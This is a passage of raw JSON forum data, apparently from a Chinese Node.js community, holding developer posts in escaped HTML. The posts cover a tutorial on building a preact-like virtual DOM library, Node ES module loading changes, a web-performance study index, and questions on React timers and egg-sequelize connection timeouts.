}],\n})\n</code></pre><p>我现在的做法是，添加文章时，更新tag下的articles字段，push 进去 article id。但我感觉这样是错的，因为如果修改了文章的标签，需要先删除原标签下的文章id，再添加到新标签下。求问有没有比较好的解决方式</p>\n</div>","title":"设计标签功能时，如何统计标签下文章数量？","last_reply_at":"2019-04-02T04:07:35.579Z","good":false,"top":false,"reply_count":5,"visit_count":376,"create_at":"2019-04-01T15:01:51.391Z","author":{"loginname":"wmui","avatar_url":"https://avatars0.githubusercontent.com/u/24876474?v=4&s=120"}},{"id":"5ca2088c31010b2dfbb41fc6","author_id":"5ac77987e34737560fccaa7b","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"https://user-gold-cdn.xitu.io/2019/4/1/169d8d8bcbd33a48?w=3968&amp;h=2976&amp;f=jpeg&amp;s=4483019\" alt=\"image\"></p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/4/1/169d8d8be0cca453?w=2976&amp;h=3968&amp;f=jpeg&amp;s=5742233\" alt=\"image\"></p>\n<p>3月31日去颐和园转了一圈, 拍的比较满意的几张照片</p>\n<h2>前言</h2>\n<p>本文主要参考了<a href=\"https://github.com/developit/preact\">preact的源码</a></p>\n<h2>准备工作</h2>\n<p>我们首先搭建开发的环境, 我们选择webpack4。值得注意的是, 因为我们需要解析JSX的语法, 我们需要使用**<a href=\"/user/babel\">@babel</a>/plugin-transform-react-jsx**插件。</p>\n<p><a href=\"/user/babel\">@babel</a>/plugin-transform-react-jsx插件会将JSX语法做出以下格式的转换。<a href=\"/user/babel\">@babel</a>/plugin-transform-react-jsx默认使用React.createElement, 我们可以通过设置插件的pragma配置项, 修改默认的函数名</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; before\nvar profile = &lt;div&gt;\n  &lt;img src=&quot;avatar.png&quot; className=&quot;profile&quot; &#x2F;&gt;\n  &lt;h3&gt;{[user.firstName, user.lastName].join(&#x27; &#x27;)}&lt;&#x2F;h3&gt;\n&lt;&#x2F;div&gt;;\n\n&#x2F;&#x2F; after\nvar profile = React.createElement(&quot;div&quot;, null,\n  React.createElement(&quot;img&quot;, { src: &quot;avatar.png&quot;, className: &quot;profile&quot; }),\n  React.createElement(&quot;h3&quot;, null, [user.firstName, user.lastName].join(&quot; &quot;))\n);\n</code></pre><pre class=\"prettyprint language-js\"><code>\nconst webpack = require(&#x27;webpack&#x27;)\nconst HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;)\nconst path = require(&#x27;path&#x27;)\nconst HappyPack = require(&#x27;happypack&#x27;)\n\nmodule.exports = {\n  devtool: &#x27;#cheap-module-eval-source-map&#x27;,\n\n  mode: &#x27;development&#x27;,\n\n  target: &#x27;web&#x27;,\n\n  entry: {\n    main: path.resolve(__dirname, &#x27;.&#x2F;example&#x2F;index.js&#x27;)\n  },\n\n  devServer: {\n    host: &#x27;0.0.0.0&#x27;,\n    port: 8080,\n    hot: true\n  },\n\n  resolve: {\n    extensions: [&#x27;.js&#x27;]\n  },\n\n  module: {\n    rules: [\n      {\n        test: &#x2F;\\.js$&#x2F;,\n        exclude: &#x2F;node_modules&#x2F;,\n        use: &#x27;happypack&#x2F;loader?id=js&#x27;\n      },\n      {\n        test: &#x2F;\\.css$&#x2F;,\n        use: [\n          {\n            loader: &#x27;style-loader&#x27;\n          },\n          {\n            loader: &#x27;css-loader&#x27;\n          }\n        ]\n      }\n    ]\n  },\n\n  plugins: [\n    new webpack.HotModuleReplacementPlugin(),\n    new HappyPack({\n      id: &#x27;js&#x27;,\n      threads: 4,\n      use: [\n        {\n          loader: &#x27;babel-loader&#x27;,\n          options: {\n            presets: [&#x27;[@babel](&#x2F;user&#x2F;babel)&#x2F;preset-env&#x27;],\n            plugins: [\n              &#x27;[@babel](&#x2F;user&#x2F;babel)&#x2F;plugin-syntax-dynamic-import&#x27;,\n              [\n                &quot;[@babel](&#x2F;user&#x2F;babel)&#x2F;plugin-transform-react-jsx&quot;,\n                {\n                  pragma: &#x27;h&#x27;\n                }\n              ]\n            ]\n          }\n        }\n      ]\n    }),\n    new HtmlWebpackPlugin({\n      template: path.resolve(__dirname, &#x27;.&#x2F;public&#x2F;index.html&#x27;)\n    })\n  ]\n}\n</code></pre><p>上面是完整的打包配置(如果严格来说, 类库应该单独打包的)。同时我们将<a href=\"/user/babel\">@babel</a>/plugin-transform-react-jsx插件, pragma参数设置为&quot;h&quot;。我们在使用的时候, 只需要在文件中引入h函数即可。</p>\n<h2>创建VNode</h2>\n<p>我们在这里将会实现h方法, h方法的作用是创建一个VNode。根据编译结果可知, h函数的参数如下。</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;**\n * type为VNode的类型\n * props为VNode的属性\n * childrens为VNode的子节点, 可能用多组子节点, 我们使用es6的rest参数\n *&#x2F;\nh(type, props, ...childrens)\n</code></pre><p>VNode本质就是Javascript中对象, 因此h函数只需要返回对应的对象即可。</p>\n<pre class=\"prettyprint language-js\"><code>\nexport function createElement (type, props, ...children) {\n  if (!props) props = {}\n  \n  props.children = [...children]\n\n  let key = props.key\n\n\tif (key) {\n    delete props.key\n  }\n\n  return createVNode(type, props, null, key)\n}\n\nexport function createVNode (type, props, text, key) {\n  const VNode = {\n    type,\n    props,\n    text,\n    key,\n    _dom: null,\n    _children: null,\n    _component: null\n  }\n\n  return VNode\n}\n</code></pre><p>我们来使用一下，看一下h函数返回的结果, h函数返回的结果即是虚拟DOM</p>\n<pre class=\"prettyprint language-js\"><code>import { h } from &#x27;yy-react&#x27;\n\nconsole.log(\n  &lt;div&gt;\n    &lt;h1&gt;Hello&lt;&#x2F;h1&gt;\n    &lt;h1&gt;World&lt;&#x2F;h1&gt;\n  &lt;&#x2F;div&gt;\n)\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/4/1/169d8d92d8d3ea36?w=1008&amp;h=618&amp;f=png&amp;s=103473\" alt=\"image\"></p>\n<h2>实现render</h2>\n<p>我们可以参考React的render函数的实现, render函数接受两个参数, React元素(VNode)以及container(挂载的DOM)。我们将要把VNode渲染成了真实的DOM节点。</p>\n<p>下面是render函数的实现, 我们在本期还没有来得及实现Diff方法, 读者可以不用关注于这些。</p>\n<p>整体代码的实现，参考(抄)了preact的源码的实现😏。(我还给preact的项目提交了pr😊，不过还没有merge😢)</p>\n<p>👇 <strong>文章的最后是具体实现, 但是一大坨对阅读不是很友好，不想看的可以略过，直接看解说。</strong></p>\n<p>我们首先将视角转向render, render函数里调用里diff函数, 将返回的dom挂载到document中。_prevVNode等属性我们会在以后用到，目前可以忽略。</p>\n<pre class=\"prettyprint language-js\"><code>\nexport function render (vnode, root) {\n  let oldVNode = root._prevVNode\n  let newVNode = root._prevVNode = vnode\n  let dom = oldVNode ? oldVNode._dom : null\n  let mounts = []\n  let newDom = diff(dom, root, newVNode, oldVNode, mounts)\n  if (newDom) {\n    root.appendChild(newDom)\n  }\n}\n</code></pre><p>在diff中，我们将对节点类型做出判断, VNode类型可以是普通的节点也可以是组件类型的节点, 我们这里先对普通类型的节点做出处理。</p>\n<pre class=\"prettyprint language-js\"><code>\nfunction diff (\n  dom,\n  root,\n  newVNode,\n  oldVNode,\n  mounts,\n  force\n) {\n\n  let newType = newVNode.type\n\n  if (typeof newType === &#x27;function&#x27;) {\n    &#x2F;&#x2F; render component\n  } else {\n    dom = diffElementNodes(\n      dom,\n      newVNode,\n      oldVNode,\n      mounts\n    )\n  }\n\n  newVNode._dom = dom\n\n  return dom\n}\n</code></pre><p>我们接着将目光转向diffElementNodes函数, 在diffElementNodes函数中我们会根据具体节点类型创建对应的真实的DOM节点。\n例如文本类型的节点我们使用createTextNode, 而普通类型的我们使用createElement</p>\n<p>因为整个VNode呈现的一种树状结构, 面对树状结构免不了使用递归去遍历每一颗节点。我们这里将创建后dom，作为父节点传入diffChildren函数中(<strong>新创建的节点会append到这个父节点中</strong>)。递归的转换的每一个子节点以及子节点的子节点。</p>\n<p>由此我们也可知道，整个VNode树的渲染的顺序是由外向里的。但是设置VNode的props的顺序则是由里向外的。</p>\n<pre class=\"prettyprint language-js\"><code>\nfunction diffElementNodes (dom, newVNode, oldVNode, mounts) {\n\n  if (!dom) {\n    dom = newVNode.type === null ? document.createTextNode(newVNode.text) : document.createElement(newVNode.type)\n  }\n\n  newVNode._dom = dom\n\n  if (newVNode.type) {\n    if (newVNode !== oldVNode) {\n      let newProps = newVNode.props\n      let oldProps = oldVNode.props\n      if (!oldProps) {\n        oldProps = {}\n      }\n      diffChildren(dom, newVNode, oldVNode, mounts)\n      diffProps(dom, newProps, oldProps)\n    }\n  }\n\n  return dom\n}\n</code></pre><p>在diffChildren中, 我们将VNode的子VNode挂载到_children属性上, 遍历每一个子节点, 将子节点带入到diff中, 完成创建的过程</p>\n<pre class=\"prettyprint language-js\"><code>\nfunction diffChildren (\n  root,\n  newParentVNode,\n  oldParentVNode,\n  mounts\n) {\n  let oldVNode, newVNode, newDom, i, j, index, p, oldChildrenLength\n\n  let newChildren = newParentVNode._children || \n                    toChildVNodeArray(newParentVNode.props.children, newParentVNode._children = [])\n\n  for (i = 0; i &lt; newChildren.length; i++) {\n    newVNode = newChildren[i]\n    oldVNode = index = null\n\n    newDom = diff(\n      oldVNode ? oldVNode._dom : null,\n      root,\n      newVNode,\n      oldVNode,\n      mounts,\n      null\n    )\n\n    if (newVNode &amp;&amp; newDom) {\n      root.appendChild(newDom)\n    }\n  }\n}\n</code></pre><p>我们在遍历递归完子节点后, 就可以使用diffProps来设置我们的root节点了。我们遍历newProps中的每一个key, 并使用setProperty将props设置到dom上, setProperty中对一些dom属性做了特殊的处理。比如处理了驼峰的css的key, 和数字的value自动添加px等。</p>\n<pre class=\"prettyprint language-js\"><code>\nfunction diffProps (dom, newProps, oldProps) {\n  for (let key in newProps) {\n    if (\n      key !==&#x27;children&#x27; &amp;&amp;\n      key!==&#x27;key&#x27; &amp;&amp;\n      (\n        !oldProps ||\n        ((key === &#x27;value&#x27; || key === &#x27;checked&#x27;) ? dom : oldProps)[key] !== newProps[key]\n      )\n    ) {\n\t\t\tsetProperty(dom, key, newProps[key], oldProps[key])\n\t\t}\n  }\n}\n\nfunction setProperty (dom, name, value, oldValue) {\n  if (name === &#x27;style&#x27;) {\n    let s = dom.style\n    if (typeof value === &#x27;string&#x27;) {\n\t\t\ts.cssText = value\n\t\t} else {\n\t\t\tif (typeof oldValue === &#x27;string&#x27;) {\n        s.cssText = &#x27;&#x27;\n      } else {\n\t\t\t\tfor (let i in oldValue) {\n\t\t\t\t\tif (value==null || !(i in value)) {\n            s.setProperty(i.replace(CAMEL_REG, &#x27;-&#x27;), &#x27;&#x27;)\n          }\n\t\t\t\t}\n\t\t\t}\n\t\t\tfor (let i in value) {\n\t\t\t\tv = value[i];\n\t\t\t\tif (oldValue==null || v!==oldValue[i]) {\n\t\t\t\t\ts.setProperty(i.replace(CAMEL_REG, &#x27;-&#x27;), typeof v===&#x27;number&#x27; &amp;&amp; IS_NON_DIMENSIONAL.test(i)===false ? (v + &#x27;px&#x27;) : v)\n\t\t\t\t}\n\t\t\t}\n\t\t}\n  } else if (value == null) {\n    dom.removeAttribute(name)\n  } else if (typeof value !== &#x27;function&#x27;) {\n    dom.setAttribute(name, value)\n  }\n}\n</code></pre><p>最后我们再次回到render函数，render函数最后的会将创建好的dom, append到挂载的dom中完成渲染。</p>\n<pre class=\"prettyprint language-js\"><code>\nroot.appendChild(newDom)\n</code></pre><h2>完整示例</h2>\n<blockquote>\n<p>github的仓库地址将在完成后放出</p>\n</blockquote>\n<pre class=\"prettyprint language-js\"><code>\n&#x2F;&#x2F; create-element.js\nexport function render (vnode, root) {\n  let oldVNode = root._prevVNode\n  let newVNode = root._prevVNode = vnode\n  let dom = oldVNode ? oldVNode._dom : null\n  let mounts = []\n  let newDom = diff(dom, root, newVNode, oldVNode, mounts)\n  if (newDom) {\n    root.appendChild(newDom)\n  }\n  runDidMount(mounts, vnode)\n}\n\n&#x2F;&#x2F; diff.js\nfunction diff (\n  dom,\n  root,\n  newVNode,\n  oldVNode,\n  mounts,\n  force\n) {\n  if (oldVNode == null || newVNode == null || newVNode.type !== oldVNode.type) {\n    if (!newVNode) return null\n    dom = null\n    oldVNode = {}\n  }\n\n  let newType = newVNode.type\n\n  if (typeof newType === &#x27;function&#x27;) {\n    &#x2F;&#x2F; render component\n  } else {\n    dom = diffElementNodes(\n      dom,\n      newVNode,\n      oldVNode,\n      mounts\n    )\n  }\n\n  newVNode._dom = dom\n\n  return dom\n}\n\nfunction diffElementNodes (dom, newVNode, oldVNode, mounts) {\n\n  if (!dom) {\n    dom = newVNode.type === null ? document.createTextNode(newVNode.text) : document.createElement(newVNode.type)\n  }\n\n  newVNode._dom = dom\n\n  if (newVNode.type) {\n    if (newVNode !== oldVNode) {\n      let newProps = newVNode.props\n      let oldProps = oldVNode.props\n      if (!oldProps) {\n        oldProps = {}\n      }\n      diffChildren(dom, newVNode, oldVNode, mounts)\n      diffProps(dom, newProps, oldProps)\n    }\n  }\n\n  return dom\n}\n\n&#x2F;&#x2F; diff-children.js\nfunction diffChildren (\n  root,\n  newParentVNode,\n  oldParentVNode,\n  mounts\n) {\n  let oldVNode, newVNode, newDom, i, j, index, p, oldChildrenLength\n\n  let newChildren = newParentVNode._children || \n                    toChildVNodeArray(newParentVNode.props.children, newParentVNode._children = [])\n\n  for (i = 0; i &lt; newChildren.length; i++) {\n    newVNode = newChildren[i]\n    oldVNode = index = null\n\n    newDom = diff(\n      oldVNode ? oldVNode._dom : null,\n      root,\n      newVNode,\n      oldVNode,\n      mounts,\n      null\n    )\n\n    if (newVNode &amp;&amp; newDom) {\n      root.appendChild(newDom)\n    }\n  }\n}\n\n&#x2F;&#x2F; diffProps.js\nfunction diffProps (dom, newProps, oldProps) {\n  for (let key in newProps) {\n    if (\n      key !==&#x27;children&#x27; &amp;&amp;\n      key!==&#x27;key&#x27; &amp;&amp;\n      (\n        !oldProps ||\n        ((key === &#x27;value&#x27; || key === &#x27;checked&#x27;) ? dom : oldProps)[key] !== newProps[key]\n      )\n    ) {\n\t\t\tsetProperty(dom, key, newProps[key], oldProps[key])\n\t\t}\n  }\n  for (let key in oldProps) {\n  }\n}\n\n&#x2F;&#x2F; diff-props\nfunction diffProps (dom, newProps, oldProps) {\n  for (let key in newProps) {\n    if (\n      key !==&#x27;children&#x27; &amp;&amp;\n      key!==&#x27;key&#x27; &amp;&amp;\n      (\n        !oldProps ||\n        ((key === &#x27;value&#x27; || key === &#x27;checked&#x27;) ? dom : oldProps)[key] !== newProps[key]\n      )\n    ) {\n\t\t\tsetProperty(dom, key, newProps[key], oldProps[key])\n\t\t}\n  }\n  for (let key in oldProps) {\n  }\n}\n\nfunction setProperty (dom, name, value, oldValue) {\n  if (name === &#x27;style&#x27;) {\n    let s = dom.style\n    if (typeof value === &#x27;string&#x27;) {\n\t\t\ts.cssText = value\n\t\t} else {\n\t\t\tif (typeof oldValue === &#x27;string&#x27;) {\n        s.cssText = &#x27;&#x27;\n      } else {\n\t\t\t\tfor (let i in oldValue) {\n\t\t\t\t\tif (value==null || !(i in value)) {\n            s.setProperty(i.replace(CAMEL_REG, &#x27;-&#x27;), &#x27;&#x27;)\n          }\n\t\t\t\t}\n\t\t\t}\n\t\t\tfor (let i in value) {\n\t\t\t\tv = value[i];\n\t\t\t\tif (oldValue==null || v!==oldValue[i]) {\n\t\t\t\t\ts.setProperty(i.replace(CAMEL_REG, &#x27;-&#x27;), typeof v===&#x27;number&#x27; &amp;&amp; IS_NON_DIMENSIONAL.test(i)===false ? (v + &#x27;px&#x27;) : v)\n\t\t\t\t}\n\t\t\t}\n\t\t}\n  } else if (value == null) {\n    dom.removeAttribute(name)\n  } else if (typeof value !== &#x27;function&#x27;) {\n    dom.setAttribute(name, value)\n  }\n}\n</code></pre><h3>其他</h3>\n<p><a href=\"https://juejin.im/post/5c97599fe51d450f357634fc\">preact源码分析(一)</a></p>\n<p><a href=\"https://juejin.im/post/5c9759cef265da611256430c\">preact源码分析(二)</a></p>\n<p><a href=\"https://juejin.im/post/5c975a1e6fb9a07107193af1\">preact源码分析(三)</a></p>\n<p><a href=\"https://juejin.im/post/5c9a36316fb9a070f03d083e\">preact源码分析(四)</a></p>\n<p><a href=\"https://juejin.im/post/5c9f7e126fb9a05e58493f9f\">preact源码分析(五)</a></p>\n</div>","title":"实现一个属于自己的React框架～～～～更新中～～～～～","last_reply_at":"2019-04-01T12:52:53.250Z","good":false,"top":false,"reply_count":1,"visit_count":386,"create_at":"2019-04-01T12:48:12.209Z","author":{"loginname":"BengBu-YueZhang","avatar_url":"https://avatars3.githubusercontent.com/u/24958677?v=4&s=120"}},{"id":"5c9de1aa484eeb3634158513","author_id":"5a0a5c9da57c17282e120654","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"https://user-gold-cdn.xitu.io/2019/3/29/169c8b7d66969005?w=640&amp;h=480&amp;f=jpeg&amp;s=104395\" alt=\"administration-articles-bank-261949.jpg\"></p>\n<p>2019年3月29日目前，Node 对 ES6 Module 的支持又有新进展。一个新的 PR 更新了当前 <code>--experimental-modules</code> 的实现方案。</p>\n<p><strong>type 动态判断模块加载模式</strong></p>\n<p>更新后的方案将根据 <code>package.json</code> 文件中指定的 type 值来判断 js 文件是使用 ESM 还是 commonjs</p>\n<ul>\n<li>如果 type 的值为 module 那么 js 文件将被作为 ESM 加载</li>\n<li>如果 type 的值为 commonjs 那么 js 文件将被作为 commonjs 来加载</li>\n</ul>\n<p>好处就是不需要使用 <code>.mjs</code> 这种与传统 js 扩展名不同的写法</p>\n<p><strong>使用 flag 指定入口文件模块加载模式</strong></p>\n<p>更新后的方案允许开发者使用 <code>--entry-type=type</code> 的方式来指定入口文件的解析方式，判断行为与 <code>package.json</code> 的 type 一致</p>\n<p><strong>支持新的扩展名 .cjs</strong></p>\n<p>新的扩展名 <code>.cjs</code> 表示在 module 模式的加载环境下去使用 commonjs 来加载扩展名为 <code>.cjs</code> 的模块</p>\n<p><strong>模块加载方式有所改变</strong></p>\n<p>新的 flag：<code>--es-module-specifier-resolution=[type]</code> 的默认值是 <code>explicit</code>，和可选值 <code>node</code>，在默认值的情况下引入模块时必须书写扩展名。</p>\n<blockquote>\n<p>This implies that ./x will only ever import exactly the sibling file “x” without appending paths or extensions. “x” is never resolved to x.mjs or x/index.mjs (or the .js equivalents).</p>\n<p>比方说这里加载 <code>./x</code> 模块，那么默认情况下只会加载名为 <code>x</code> 的模块，而不是去尝试加载 <code>x.mjs</code> 或 <code>x/index.mjs</code></p>\n<p>提案在此：<a href=\"https://github.com/GeoffreyBooth/node-import-file-specifier-resolution-proposal#proposal\">https://github.com/GeoffreyBooth/node-import-file-specifier-resolution-proposal#proposal</a></p>\n</blockquote>\n<p><strong>在 ESM 模式下加载 json 文件</strong></p>\n<p><code>--experimental-json-loader</code> flag 能够在 ESM 模式下加载 JSON 文件。</p>\n<p>导入的 json 文件将提供的 json 文件中的内容转化为一个对象或数组。就好像直接通过 JSON 模块 parse 了一样。</p>\n<p><strong>main 根据 type 的值确认入口文件加载模式</strong></p>\n<p>在 <code>package.json</code> 文件中的 main 字段指定入口文件，根据 type 字段来指定是 commonjs 还是 ESM 模式来加载。</p>\n<p>参考：</p>\n<ul>\n<li><a href=\"https://github.com/nodejs/node/pull/26745/commits/b1094dbe19f31f7a69ad16d193748f610b159073\">https://github.com/nodejs/node/pull/26745/commits/b1094dbe19f31f7a69ad16d193748f610b159073</a></li>\n<li><a href=\"https://github.com/GeoffreyBooth/node-import-file-specifier-resolution-proposal#proposal\">https://github.com/GeoffreyBooth/node-import-file-specifier-resolution-proposal#proposal</a></li>\n</ul>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/29/169c8b7d668e008f?w=960&amp;h=260&amp;f=jpeg&amp;s=58713\" alt=\"JS 菌公众账号\"></p>\n<p>请关注我的订阅号，不定期推送有关 JS 的技术文章，只谈技术不谈八卦 😊</p>\n</div>","title":"Node 引入 ESM 新方案","last_reply_at":"2019-04-01T10:23:22.960Z","good":false,"top":false,"reply_count":2,"visit_count":803,"create_at":"2019-03-29T09:13:14.005Z","author":{"loginname":"oliyg","avatar_url":"https://avatars1.githubusercontent.com/u/19631785?v=4&s=120"}},{"id":"5a311f729807389a1809f37a","author_id":"57b99bc2dcaeb5d932db220a","tab":"share","content":"<div class=\"markdown-text\"><h1>Web性能</h1>\n<p>从底层计算机网络协议到应用层各个方面去理解Web性能。目前项目处于刚开始阶段，欢迎对性能优化感兴趣的同学共同参与总结！</p>\n<p>Github: <a href=\"https://github.com/laoqiren/web-performance\">https://github.com/laoqiren/web-performance</a></p>\n<h2>目录</h2>\n<ul>\n<li><a href=\"https://github.com/laoqiren/web-performance/blob/master/%E7%BD%91%E9%A1%B5%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86/README.md\">网页渲染原理</a>\n<ul>\n<li><a href=\"https://github.com/laoqiren/web-performance/blob/master/%E7%BD%91%E9%A1%B5%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86/%E6%B8%B2%E6%9F%93%E8%BF%87%E7%A8%8B.md\">渲染过程</a></li>\n<li><a href=\"https://github.com/laoqiren/web-performance/blob/master/%E7%BD%91%E9%A1%B5%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86/%E8%B5%84%E6%BA%90%E5%8A%A0%E8%BD%BD%E9%A1%BA%E5%BA%8F.md\">资源加载顺序</a></li>\n<li><a href=\"https://github.com/laoqiren/web-performance/blob/master/%E7%BD%91%E9%A1%B5%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86/%E6%B8%B2%E6%9F%93%E8%BF%87%E7%A8%8B.md\">浏览器优化策略</a></li>\n<li><a href=\"/%E7%BD%91%E9%A1%B5%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86/repaint%E4%B8%8Ereflow.md\">repaint与reflow</a></li>\n</ul>\n</li>\n<li><a href=\"https://github.com/laoqiren/web-performance/tree/master/%E5%B8%A6%E5%AE%BD%E4%B8%8E%E5%BB%B6%E8%BF%9F\">带宽与延迟</a>\n<ul>\n<li><a href=\"https://github.com/laoqiren/web-performance/blob/master/%E5%B8%A6%E5%AE%BD%E4%B8%8E%E5%BB%B6%E8%BF%9F/%E4%BB%8E%E8%BE%93%E5%85%A5URL%E5%BC%80%E5%A7%8B.md\">从输入URL开始</a></li>\n<li><a href=\"https://github.com/laoqiren/web-performance/blob/master/%E5%B8%A6%E5%AE%BD%E4%B8%8E%E5%BB%B6%E8%BF%9F/%E5%B8%A6%E5%AE%BD%E4%B8%8E%E5%BB%B6%E8%BF%9F.md\">带宽与延迟</a></li>\n<li>TCP协议细节</li>\n<li>HTTP 1.x性能</li>\n<li>针对性优化</li>\n</ul>\n</li>\n<li><a href=\"https://github.com/laoqiren/web-performance/blob/master/%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6/README.md\">缓存机制</a>\n<ul>\n<li><a href=\"https://github.com/laoqiren/web-performance/blob/master/%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6/%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5.md\">首部字段</a></li>\n<li><a href=\"https://github.com/laoqiren/web-performance/blob/master/%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A1%8C%E4%B8%BA.md\">浏览器行为</a></li>\n<li><a href=\"https://github.com/laoqiren/web-performance/blob/master/%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6/%E4%BC%98%E5%8C%96.md\">优化</a></li>\n</ul>\n</li>\n<li><a href=\"https://github.com/laoqiren/web-performance/tree/master/%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90\">静态资源</a>\n<ul>\n<li>减少请求</li>\n<li><a href=\"https://github.com/laoqiren/web-performance/blob/master/%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90/%E8%B5%84%E6%BA%90%E5%8E%8B%E7%BC%A9.md\">资源压缩</a></li>\n<li><a href=\"https://github.com/laoqiren/web-performance/blob/master/%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90/%E5%9B%BE%E5%83%8F%E4%BC%98%E5%8C%96.md\">图片资源优化</a></li>\n<li>Webpack</li>\n<li>CDN</li>\n</ul>\n</li>\n<li>Virtual DOM\n<ul>\n<li><a href=\"https://github.com/laoqiren/web-performance/blob/master/%E8%99%9A%E6%8B%9FDOM/React%E5%9F%BA%E7%A1%80.md\">React基础</a></li>\n<li>实现</li>\n<li>diff算法</li>\n<li>性能考虑</li>\n</ul>\n</li>\n<li>SPA与SSR\n<ul>\n<li>SPA问题</li>\n<li>服务端渲染</li>\n<li>同构应用</li>\n<li>性能问题</li>\n</ul>\n</li>\n<li>HTTP2\n<ul>\n<li>新特性概览</li>\n<li>性能提升</li>\n<li>工程实践</li>\n</ul>\n</li>\n<li>HTTPS性能影响\n<ul>\n<li>TLS原理</li>\n<li>性能影响</li>\n</ul>\n</li>\n<li>高性能JavaScript\n<ul>\n<li>V8与JIT</li>\n<li>内存泄露</li>\n<li>GC机制</li>\n<li>算法与流程</li>\n<li>Web worker</li>\n</ul>\n</li>\n<li>WebAssembly</li>\n<li>PWA与离线应用</li>\n<li>即时运用与P2P</li>\n<li>Node.js性能优化</li>\n<li>集群与负载均衡</li>\n<li>数据库相关</li>\n<li>性能测试\n<ul>\n<li>Chrome开发者工具</li>\n<li>benchmark</li>\n<li>压力测试</li>\n</ul>\n</li>\n</ul>\n<h2>引用说明</h2>\n<p>此项目会引用许多其他文章书籍的图片或部分内容，我会尽量都加以注明，如果有部分遗漏以致于侵犯到您的版权，烦请联系我修改！此项目旨在整理零碎的知识和实践方案，方便交流学习，请勿用于商业用途。</p>\n<h2>参与贡献</h2>\n<ul>\n<li>提想法和建议</li>\n<li>纠错完善</li>\n<li>增加新章节或内容</li>\n</ul>\n</div>","title":"性能优化知识与实践整理","last_reply_at":"2019-04-01T09:47:23.208Z","good":false,"top":false,"reply_count":16,"visit_count":6793,"create_at":"2017-12-13T12:39:14.755Z","author":{"loginname":"laoqiren","avatar_url":"https://avatars2.githubusercontent.com/u/16136702?v=4&s=120"}},{"id":"5ca1cdc231010b2dfbb41ded","author_id":"571053a36a2d2bda52de95ce","tab":"ask","content":"<div class=\"markdown-text\"><p>请求各位大佬，有个react问题，我在组件中写个了定时器同步系统时间，然后用鼠标滑动选择antd库下拉框时，每隔一秒，滑动条就会重新回到顶部，这如何解决？\n已经查明原因是 定时器每秒执行一次render导致的；但还不知道如何解决，菜鸟求助啊</p>\n</div>","title":"react 定时器 select下拉框出现问题","last_reply_at":"2019-04-01T08:37:22.812Z","good":false,"top":false,"reply_count":0,"visit_count":344,"create_at":"2019-04-01T08:37:22.812Z","author":{"loginname":"RocketV2","avatar_url":"https://avatars2.githubusercontent.com/u/12555991?v=4&s=120"}},{"id":"5bd11d0eb56c42645edb7c7b","author_id":"57d0da4c3cfda47b2c233155","tab":"ask","content":"<div class=\"markdown-text\"><p>egg项目使用egg-sequelize作为orm框架，该项目使用的mysql数据库和另外一个项目在一起，只是库不同而已，另外一个项目在做压力测试的时候将数据库cpu使用率提高到150%，持续时间挺长的。后来发现egg项目这边请求数据库老是超时，即使mysql数据库恢复正常之后，依然超时，重启egg项目之后才恢复正常，感觉就是连接池里的连接全部失效了而没有释放。想问问大家有没有遇到同样的问题，下面是错误信息和sequelize插件的配置：</p>\n<pre class=\"prettyprint\"><code>2018-10-25 09:01:22,923 ERROR 15972 Fatal error: ResourceRequest timed out, ctx: {&quot;request&quot;:{&quot;method&quot;:&quot;POST&quot;,&quot;url&quot;:&quot;&#x2F;dcc&#x2F;v1&#x2F;quota&#x2F;get&quot;,&quot;header&quot;:{&quot;host&quot;:&quot;dccs.bw-xt.com&quot;,&quot;x-real-ip&quot;:&quot;XXX&quot;,&quot;x-forwarded-for&quot;:&quot;XXX&quot;,&quot;connection&quot;:&quot;close&quot;,&quot;content-length&quot;:&quot;176&quot;,&quot;user-agent&quot;:&quot;Needs Clouds Client 5.0&quot;,&quot;accept&quot;:&quot;*&#x2F;*&quot;,&quot;content-type&quot;:&quot;application&#x2F;json;charset=utf-8&quot;}},&quot;response&quot;:{&quot;status&quot;:404,&quot;message&quot;:&quot;Not Found&quot;,&quot;header&quot;:{&quot;vary&quot;:&quot;Origin&quot;}},&quot;app&quot;:{&quot;env&quot;:&quot;prod&quot;,&quot;name&quot;:&quot;needs_dccs&quot;,&quot;baseDir&quot;:&quot;&#x2F;srv&#x2F;www&#x2F;vhosts&#x2F;Needs_Dccs&quot;,&quot;subdomainOffset&quot;:2,&quot;config&quot;:&quot;&lt;egg config&gt;&quot;,&quot;controller&quot;:&quot;&lt;egg controller&gt;&quot;,&quot;httpclient&quot;:&quot;&lt;egg httpclient&gt;&quot;,&quot;loggers&quot;:&quot;&lt;egg loggers&gt;&quot;,&quot;middlewares&quot;:&quot;&lt;egg middlewares&gt;&quot;,&quot;router&quot;:&quot;&lt;egg router&gt;&quot;,&quot;serviceClasses&quot;:&quot;&lt;egg serviceClasses&gt;&quot;},&quot;originalUrl&quot;:&quot;&#x2F;dcc&#x2F;v1&#x2F;quota&#x2F;get&quot;,&quot;req&quot;:&quot;&lt;original node req&gt;&quot;,&quot;res&quot;:&quot;&lt;original node res&gt;&quot;,&quot;socket&quot;:&quot;&lt;original node socket&gt;&quot;}\n2018-10-25 09:01:31,620 ERROR 15996 [-&#x2F;127.0.0.1&#x2F;-&#x2F;30005ms POST &#x2F;dcc&#x2F;v1&#x2F;quota&#x2F;get] nodejs.TimeoutError: ResourceRequest timed out\n    at ResourceRequest._fireTimeout 